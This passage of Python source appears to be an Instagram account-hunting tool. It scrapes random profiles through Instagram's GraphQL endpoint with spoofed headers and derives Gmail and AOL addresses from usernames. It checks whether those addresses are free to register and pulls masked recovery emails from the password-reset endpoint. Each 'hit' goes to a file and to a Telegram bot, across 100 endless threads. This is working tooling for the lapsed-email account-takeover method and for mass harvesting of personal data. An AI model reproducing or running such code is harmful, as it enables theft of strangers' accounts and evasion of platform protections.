                "sec-fetch-site": "same-origin",
            }
            data = urllib.parse.urlencode({"email_or_username": username})
            r = client.post(_RESET_AJAX_URL, content=data.encode(), headers=headers)
            client.close()
            result = r.json()
            status = result.get("status", "")
            if status == "ok":
                for key in ("obfuscated_email", "contact_point", "masked_email", "email"):
                    val = result.get(key)
                    if val:
                        return val
                return "-"
            elif status == "fail":
                return "Fail: " + result.get("message", "")
            if attempt < max_retries - 1:
                continue
            return "-"
        except Exception:
            if attempt < max_retries - 1:
                continue
            return "-"
    return "-"

def process_hit(username: str, domain: str, user: dict, google_session: requests.Session) -> None:
    user_id = user.get('pk', 'Unknown')
    followers = user.get('follower_count', 0) or 0
    followings = user.get('following_count', 0) or 0
    posts = user.get('media_count', 0) or 0
    name = user.get('full_name', 'None') or 'None'
    bio = (user.get('biography', '') or '')[:50]
    private = user.get('is_private', False)
    verified = user.get('is_verified', False)
    business = user.get('is_business', False)
    year = estimate_year(user_id)
    email = f"{username}@{domain}"
    reset_mask = fetch_reset_email(username)
    meta = 'True' if posts > 2 else 'False'

    stats.increment('hits')
    hits_snapshot = stats.hits

    print(f"{G}✅𝐇𝐈𝐓 #{hits_snapshot}: {email} (👥 {followers}){RESET}")

    box = f"""
◈━━━━━━━━━━━━━━━━━━━━━◈
  ✦ 𝗔𝗗𝗜𝗧𝗬𝗔 𝗜𝗡𝗦𝗧𝗔 𝗛𝗨𝗡𝗧𝗘𝗥 ✦
◈━━━━━━━━━━━━━━━━━━━━━◈
◈ 𝐁ᴜsɪɴᴇss   └─► {business}
◈ 𝐌ᴇᴛᴀ       └─► {meta}
◈ 𝐍ᴀᴍᴇ        └─► {name}
◈ 𝐔sᴇʀɴᴀᴍᴇ    └─► @{username}
◈ 𝐃ᴏᴍᴀɪɴ      └─► {domain}
◈ 𝐅ᴏʟʟᴏᴡᴇʀs   └─► {followers}
◈ 𝐅ᴏʟʟᴏᴡɪɴɢ   └─► {followings}
◈ 𝐏ᴏsᴛs       └─► {posts}
◈ 𝐁ɪᴏ       └─► {bio}
◈ 𝐄ᴍᴀɪʟ       └─► {email}
◈ 𝐀ᴛᴛᴀᴄʜᴇᴅ    └─► {reset_mask}
◈ 𝐘ᴇᴀʀ        └─► {year}
◈ 𝐏ᴏʀᴛғᴏʟɪᴏ   └─► https://instagram.com/{username}

◈━━━━━━━━━━━━━━━━━━◈
✦ 𝗖ʀᴇᴀᴛᴏʀ ─► 𝗔𝗗𝗜𝗧𝗬𝗔 𝗛𝗨𝗡𝗧
◈━━━━━━━━━━━━━━━━━━◈
"""

    with open(CONFIG["output_file"], 'a', encoding='utf-8') as f:
        f.write(box + "\n")

    if BOT_TOKEN and CHAT_ID:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": box},
                timeout=10
            )
        except Exception:
            pass

def estimate_year(user_id) -> str:
    try:
        user_id = int(user_id)
        for low, high, year in CONFIG["id_ranges"]:
            if low <= user_id <= high:
                return str(year)
        return "2023+"
    except Exception:
        return "Unknown"

def scrape_profiles(min_id: int, max_id: int, google_session: requests.Session) -> None:
    session = requests.Session()
    
    try:
        session.get('https://www.instagram.com/', headers={'User-Agent': random_web_ua()})
    except:
        pass

    while True:
        try:
            low, high, year = random.choice(CONFIG["id_ranges"])
            uid = random.randint(low, high)

            lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'user-agent': random_ua(),
                'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
                'x-fb-lsd': lsd,
                'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            variables = {
                "enable_integrity_filters": True,
                "id": str(uid),
                "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
                "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                'variables': json.dumps(variables),
                'server_timestamps': 'true',
                'doc_id': '26672929172408668',   
            }
            resp = session.post(CONFIG["insta_graphql"], headers=headers, data=data, timeout=10)

            if resp.status_code == 200:
                user = resp.json().get('data', {}).get('user')
                if user and user.get('username'):
                    username = user['username']
                    if MIN_FOLLOWERS > 0 and user.get('follower_count', 0) < MIN_FOLLOWERS:
                        continue
                    for domain in CONFIG["domains"]:
                        email = f"{username}{domain}"
                        if lookup(email):
                            if domain == "@gmail.com":
                                if check_gmail_availability(email, google_session):
                                    process_hit(username, "gmail.com", user, google_session)
                            elif domain == "@aol.com":
                                if check_aol_availability(email, google_session):
                                    process_hit(username, "aol.com", user, google_session)
            time.sleep(0.08)
        except Exception:
            time.sleep(0.2)

def stats_printer() -> None:
    while True:
        os.system('clear')
        h, g, b, be, t, l = stats.snapshot()
        
        print(f"""◈━━━━━━━━━━━━━━━━━━━━━━━━◈
        ✦ 𝗔𝗗𝗜𝗧𝗬𝗔 𝗜𝗡𝗦𝗧𝗔 𝗛𝗨𝗡𝗧𝗘𝗥 ✦
◈━━━━━━━━━━━━━━━━━━━━━━━━◈

◈ 𝐇ɪᴛs       └──► {h}
◈ 𝐆ᴏᴏᴅ     └──► {g}
◈ 𝐁ᴀᴅ       └──► {b}
◈ 𝐓ᴀᴋᴇɴ    └──► {t}

◈━━━━━━━━━━━━━━━━━━━━━━━━◈
✦ 𝗖ʀᴇᴀᴛᴏʀ ─► @team_kryzen ✦
◈━━━━━━━━━━━━━━━━━━━━━━━━◈
""")
        time.sleep(5)  # prevent CPU burn on Render

COUNTRY_FLAGS = {
    "Afghanistan": "🇦🇫", "Albania": "🇦🇱", "Algeria": "🇩🇿", "Andorra": "🇦🇩",
    "Angola": "🇦🇴", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺",
    "Austria": "🇦🇹", "Azerbaijan": "🇦🇿", "Bahamas": "🇧🇸", "Bahrain": "🇧🇭",
    "Bangladesh": "🇧🇩", "Barbados": "🇧🇧", "Belarus": "🇧🇾", "Belgium": "🇧🇪",
    "Belize": "🇧🇿", "Benin": "🇧🇯", "Bhutan": "🇧🇹", "Bolivia": "🇧🇴",
    "Bosnia and Herzegovina": "🇧🇦", "Botswana": "🇧🇼", "Brazil": "🇧🇷",
    "Brunei": "🇧🇳", "Bulgaria": "🇧🇬", "Burkina Faso": "🇧🇫", "Burundi": "🇧🇮",
    "Côte d'Ivoire": "🇨🇮", "Cabo Verde": "🇨🇻", "Cambodia": "🇰🇭",
    "Cameroon": "🇨🇲", "Canada": "🇨🇦", "Central African Republic": "🇨🇫",
    "Chad": "🇹🇩", "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴",
    "Comoros": "🇰🇲", "Congo": "🇨🇬", "Costa Rica": "🇨🇷", "Croatia": "🇭🇷",
    "Cuba": "🇨🇺", "Cyprus": "🇨🇾", "Czech Republic": "🇨🇿",
    "Democratic Republic of the Congo": "🇨🇩", "Denmark": "🇩🇰", "Djibouti": "🇩🇯",
    "Dominica": "🇩🇲", "Dominican Republic": "🇩🇴", "Ecuador": "🇪🇨",
    "Egypt": "🇪🇬", "El Salvador": "🇸🇻", "Equatorial Guinea": "🇬🇶",
    "Eritrea": "🇪🇷", "Estonia": "🇪🇪", "Eswatini": "🇸🇿", "Ethiopia": "🇪🇹",
    "Fiji": "🇫🇯", "Finland": "🇫🇮", "France": "🇫🇷", "Gabon": "🇬🇦",
    "Gambia": "🇬🇲", "Georgia": "🇬🇪", "Germany": "🇩🇪", "Ghana": "🇬🇭",
    "Greece": "🇬🇷", "Grenada": "🇬🇩", "Guatemala": "🇬🇹", "Guinea": "🇬🇳",
    "Guinea-Bissau": "🇬🇼", "Guyana": "🇬🇾", "Haiti": "🇭🇹", "Honduras": "🇭🇳",
    "Hungary": "🇭🇺", "Iceland": "🇮🇸", "India": "🇮🇳", "Indonesia": "🇮🇩",
    "Iran": "🇮🇷", "Iraq": "🇮🇶", "Ireland": "🇮🇪", "Israel": "🇮🇱",
    "Italy": "🇮🇹", "Jamaica": "🇯🇲", "Japan": "🇯🇵", "Jordan": "🇯🇴",
    "Kazakhstan": "🇰🇿", "Kenya": "🇰🇪", "Kiribati": "🇰🇮", "Kuwait": "🇰🇼",
    "Kyrgyzstan": "🇰🇬", "Laos": "🇱🇦", "Latvia": "🇱🇻", "Lebanon": "🇱🇧",
    "Lesotho": "🇱🇸", "Liberia": "🇱🇷", "Libya": "🇱🇾", "Liechtenstein": "🇱🇮",
    "Lithuania": "🇱🇹", "Luxembourg": "🇱🇺", "Madagascar": "🇲🇬", "Malawi": "🇲🇼",
    "Malaysia": "🇲🇾", "Maldives": "🇲🇻", "Mali": "🇲🇱", "Malta": "🇲🇹",
    "Marshall Islands": "🇲🇭", "Mauritania": "🇲🇷", "Mauritius": "🇲🇺",
    "Mexico": "🇲🇽", "Micronesia": "🇫🇲", "Moldova": "🇲🇩", "Monaco": "🇲🇨",
    "Mongolia": "🇲🇳", "Montenegro": "🇲🇪", "Morocco": "🇲🇦", "Mozambique": "🇲🇿",
    "Myanmar": "🇲🇲", "Namibia": "🇳🇦", "Nauru": "🇳🇷", "Nepal": "🇳🇵",
    "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nicaragua": "🇳🇮", "Niger": "🇳🇪",
    "Nigeria": "🇳🇬", "North Korea": "🇰🇵", "North Macedonia": "🇲🇰",
    "Norway": "🇳🇴", "Oman": "🇴🇲", "Pakistan": "🇵🇰", "Palau": "🇵🇼",
    "Palestine": "🇵🇸", "Panama": "🇵🇦", "Papua New Guinea": "🇵🇬",
    "Paraguay": "🇵🇾", "Peru": "🇵🇪", "Philippines": "🇵🇭", "Poland": "🇵🇱",
    "Portugal": "🇵🇹", "Qatar": "🇶🇦", "Romania": "🇷🇴", "Russia": "🇷🇺",
    "Rwanda": "🇷🇼", "Saint Kitts and Nevis": "🇰🇳", "Saint Lucia": "🇱🇨",
    "Saint Vincent and the Grenadines": "🇻🇨", "Samoa": "🇼🇸",
    "San Marino": "🇸🇲", "Sao Tome and Principe": "🇸🇹", "Saudi Arabia": "🇸🇦",
    "Senegal": "🇸🇳", "Serbia": "🇷🇸", "Seychelles": "🇸🇨", "Sierra Leone": "🇸🇱",
    "Singapore": "🇸🇬", "Slovakia": "🇸🇰", "Slovenia": "🇸🇮",
    "Solomon Islands": "🇸🇧", "Somalia": "🇸🇴", "South Africa": "🇿🇦",
    "South Korea": "🇰🇷", "South Sudan": "🇸🇸", "Spain": "🇪🇸",
    "Sri Lanka": "🇱🇰", "Sudan": "🇸🇩", "Suriname": "🇸🇷", "Sweden": "🇸🇪",
    "Switzerland": "🇨🇭", "Syria": "🇸🇾", "Tajikistan": "🇹🇯", "Tanzania": "🇹🇿",
    "Thailand": "🇹🇭", "Timor-Leste": "🇹🇱", "Togo": "🇹🇬", "Tonga": "🇹🇴",
    "Trinidad and Tobago": "🇹🇹", "Tunisia": "🇹🇳", "Turkey": "🇹🇷",
    "Turkmenistan": "🇹🇲", "Tuvalu": "🇹🇻", "Uganda": "🇺🇬", "Ukraine": "🇺🇦",
    "United Arab Emirates": "🇦🇪", "United Kingdom": "🇬🇧",
    "United States": "🇺🇸", "Uruguay": "🇺🇾", "Uzbekistan": "🇺🇿",
    "Vanuatu": "🇻🇺", "Vatican City": "🇻🇦", "Venezuela": "🇻🇪",
    "Vietnam": "🇻🇳", "Yemen": "🇾🇪", "Zambia": "🇿🇲", "Zimbabwe": "🇿🇼"
}

def main() -> None:
    # ════ ALL HARDCODED - NO INPUTS ════
    # ALL YEARS ENABLED
    CONFIG["id_ranges"] = ALL_YEAR_RANGES

    print("\033[95m┌─[  𝐈𝐒 𝐇𝐔𝐍𝐓𝐈𝐍𝐆 𝐅𝐎𝐑 𝐈𝐃𝐒 - ALL YEARS 2010-2025]")

    # Google token - retry forever until success (never exits on Render)
    while not generate_google_token():
        print(f"{R}❌Google token failed - retrying in 30s...{RESET}")
        time.sleep(30)

    threading.Thread(target=stats_printer, daemon=True).start()

    g_session = requests.Session()

    with ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(100):
            executor.submit(scrape_profiles, 0, 0, g_session)
        # Infinite keep-alive - never stops
        while True:
            time.sleep(60)

if __name__ == "__main__":
    main()